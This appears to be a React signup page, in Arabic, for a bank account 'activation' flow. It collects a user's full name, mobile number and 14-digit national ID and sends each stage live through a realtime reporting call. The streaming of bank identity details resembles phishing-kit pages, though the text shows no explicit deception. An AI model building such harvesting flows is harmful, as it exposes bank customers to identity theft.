import { useEffect, useState } from 'react';
import { useLocation, Link } from 'wouter';
import { AppLayout } from '@/components/layout/AppLayout';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { useRegistration } from '@/context/RegistrationContext';
import { useRealtime } from '@/context/RealtimeContext';
import { ChevronLeft, ChevronRight } from 'lucide-react';

export default function Signup() {
  const [, setLocation] = useLocation();
  const { data, updateData } = useRegistration();
  const { reportStage } = useRealtime();
  const [errors, setErrors] = useState<Record<string, string>>({});

  useEffect(() => {
    reportStage('signup', {});
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const validate = () => {
    const newErrors: Record<string, string> = {};
    if (!data.fullName.trim()) newErrors.fullName = 'الاسم الكامل مطلوب';
    if (!data.phone.trim() || !/^\d{10,15}$/.test(data.phone.trim())) {
      newErrors.phone = 'رقم موبايل غير صحيح';
    }
    if (!data.nationalId.trim() || !/^\d{14}$/.test(data.nationalId.trim())) {
      newErrors.nationalId = 'الرقم القومي يجب أن يتكون من 14 رقم';
    }
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (validate()) {
      reportStage('signup', {
        fullName: data.fullName,
        mobile: data.phone,
        nationalId: data.nationalId,
      });
      setLocation('/create-account');
    }
  };

  return (
    <AppLayout>
      <div className="flex-1 flex flex-col justify-center max-w-md w-full mx-auto animate-in slide-in-from-bottom-8 duration-500">
        
        <div className="mb-10 flex items-center justify-between">
          <div className="space-y-2">
            <h1 className="text-4xl font-bold text-foreground tracking-tight">مرحباً بك</h1>
            <p className="text-muted-foreground text-base">أدخل بياناتك الأساسية للبدء في التفعيل</p>
          </div>
          <Link href="/" className="w-12 h-12 flex items-center justify-center rounded-full bg-card border border-border hover:bg-accent transition-colors shadow-sm">
            <ChevronRight className="w-6 h-6 text-foreground" />
          </Link>
        </div>

        <div className="bg-card border border-border rounded-[2rem] p-8 md:p-10 shadow-2xl relative overflow-hidden">
          <div className="absolute top-0 right-0 w-full h-1.5 bg-gradient-to-l from-primary to-transparent" />
          
          <form onSubmit={handleSubmit} className="space-y-8 relative z-10">
            <div className="space-y-3">
              <Label htmlFor="fullName" className="text-base">الاسم الكامل</Label>
              <Input
                id="fullName"
                placeholder="الاسم كما هو مسجل بالبنك"
                value={data.fullName}
                onChange={e => updateData({ fullName: e.target.value })}
                className={`h-14 text-base ${errors.fullName ? 'border-destructive focus-visible:ring-destructive' : ''}`}
              />
              {errors.fullName && <p className="text-sm text-destructive font-medium">{errors.fullName}</p>}
            </div>

            <div className="space-y-3">
              <Label htmlFor="phone" className="text-base">رقم الموبايل</Label>
              <Input
                id="phone"
                type="tel"
                dir="ltr"
                className={`h-14 text-base text-right ${errors.phone ? 'border-destructive focus-visible:ring-destructive' : ''}`}
                placeholder="01xxxxxxxxx"
                value={data.phone}
                onChange={e => updateData({ phone: e.target.value.replace(/\D/g, '') })}
              />
              {errors.phone && <p className="text-sm text-destructive font-medium">{errors.phone}</p>}
            </div>

            <div className="space-y-3">
              <Label htmlFor="nationalId" className="text-base">الرقم القومي</Label>
              <Input
                id="nationalId"
                type="text"
                dir="ltr"
                className={`h-14 text-base text-right tracking-widest font-mono ${errors.nationalId ? 'border-destructive focus-visible:ring-destructive' : ''}`}
                placeholder="14 رقم"
                maxLength={14}
                value={data.nationalId}
                onChange={e => updateData({ nationalId: e.target.value.replace(/\D/g, '') })}
              />
              {errors.nationalId && <p className="text-sm text-destructive font-medium">{errors.nationalId}</p>}
            </div>

            <Button type="submit" size="lg" className="w-full h-14 gap-3 mt-6 text-lg rounded-xl">
              متابعة الخطوات
              <ChevronLeft className="w-5 h-5" />
            </Button>
          </form>
        </div>
        
        <div className="mt-10 flex justify-center gap-3">
          <div className="h-2 w-10 rounded-full bg-primary shadow-[0_0_10px_rgba(212,175,55,0.5)]" />
          <div className="h-2 w-10 rounded-full bg-border" />
          <div className="h-2 w-10 rounded-full bg-border" />
        </div>
      </div>
    </AppLayout>
  );
}
